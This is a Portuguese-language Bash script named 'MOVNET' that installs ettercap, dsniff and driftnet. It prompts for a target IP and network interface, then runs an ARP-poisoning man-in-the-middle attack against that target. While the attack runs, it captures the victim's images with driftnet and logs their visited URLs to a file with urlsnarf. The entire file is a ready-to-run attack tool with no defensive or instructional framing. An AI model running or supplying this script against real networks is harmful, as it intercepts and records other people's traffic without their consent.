#!/bin/bash
#--------------------------------------------------------------------------------------------------------------
                            #Verificação do tipo de usuário, se é root ou não.

[ $(id -u) -ne 0 ] && { echo -e "root?"; sudo mitm.sh ; exit ;} || echo -e "Ok"
#--------------------------------------------------------------------------------------------------------------
                           #aqui inicia a verificação de pacotes para instalação


echo -e "Estamos analisando os pacotes necessários...\n"
pacote=$(dpkg --get-selections | grep ettercap-text-only )
if [ -n "$pacote" ] ;
  sleep 1
 then
     echo -e "Ettercap -------------------------------------- OK\n"
 else
     echo -e "Ettercap ----------------------------- Nao instalado\n"
     echo "A aplicação ettercap-text-only será instalado, tecle [ENTER] para continuar."
     read
     sudo apt-get install ettercap-text-only
fi
pacote=$(dpkg --get-selections | grep dsniff )
if [ -n "$pacote" ] ;
 then
     echo -e "Urlsnarf -------------------------------------- OK\n"
 else 
     echo -e "Urlsnarf ----------------------------- Nao instalado\n"
     echo "A aplicação Urlsnarf será instalado, tecle [ENTER] para continuar."
     read
     sudo apt-get install dsniff
fi
pacote=$(dpkg --get-selections | grep driftnet ) 
if [ -n "$pacote" ] ;
 then
     echo -e "Driftnet -------------------------------------- OK\n"
 else
     echo -e "Driftnet ----------------------------- Nao instalado\n"
     echo "A aplicação Driftnet será instalado, tecle [ENTER] para continuar."
     read
     sudo apt-get install driftnet
fi
pacote=$(dpkg --get-selections | grep figlet )
if [ -n "$pacote" ] ;
 then 
     echo -e "Figlet ---------------------------------------- OK\n"
 else
     echo -e "Figlet ----------------------------- Nao instalado\n"
     echo "A aplicação Figlet será instalado, tecle [ENTER] para continuar."
     read
     sudo apt-get install figlet
fi
pacote=$(dpkg --get-selections | grep dialog )
if [ -n "$pacote" ] ;
 then 
     echo -e "Dialog ---------------------------------------- OK\n"
 else
     echo -e "Dialog ----------------------------- Nao instalado\n"
     echo "A aplicação Dialog será instalado, tecle [ENTER] para continuar."
     read
     sudo apt-get install dialog
fi
clear

#--------------------------------------------------------------------------------------------------------------
                                #inicio da coleta de dados

sleep 1
figlet "         MOVNET"
echo "                Movement On network"
echo -e "Dev: @sysrogue\n"
echo "------------------------------------------"
    echo
    echo -n "Localizar o IP do alvo, s/n? "
 read v0
if [ "$v0" = s ] ;
 then 
    route
    echo "------------------------------------------"
    echo
    echo "Insira o IP do alvo."
    echo -n ">> " ;read IP
    echo "------------------------------------------"
    echo
   else
    echo
    echo "------------------------------------------"
   echo "Insira o IP do alvo"
    echo -n ">> " ;read IP
    echo "------------------------------------------"
    echo
fi    
    echo
    echo "insira interface de rede utilizada"
    echo -n ">>" ;read int
    echo "------------------------------------------"
     echo -n "Inserir host alvo, s/n? "
     read V

#--------------------------------------------------------------------------------------------------------------
                                      #inicio do ataque MITM

if [[ "$V" = s ]]; then
    echo -n ">> " ; read alvo
    driftnet -i $int&
    xterm -e ./alvo.sh&
    xterm -e ettercap -T -q -i $int -M arp:remote /$IP//&
    urlsnarf -i $int | grep $alvo > url.txt
elif [[ "$V" = n ]]; then
    driftnet -i $int&
    xterm -e ./alvo.sh&
    xterm -e ettercap -T -q -i $int -M arp:remote /$IP//&
    urlsnarf -i $int > url.txt
else
  echo "------------------------------------------"
  echo "Entrada desconhecida, deseja executar o script novamente s/n?"
  echo -n ">>" ; read v1
  if [[ "$v1" = s ]]; then
    ./mitm.sh
  else
    exit
fi
fi
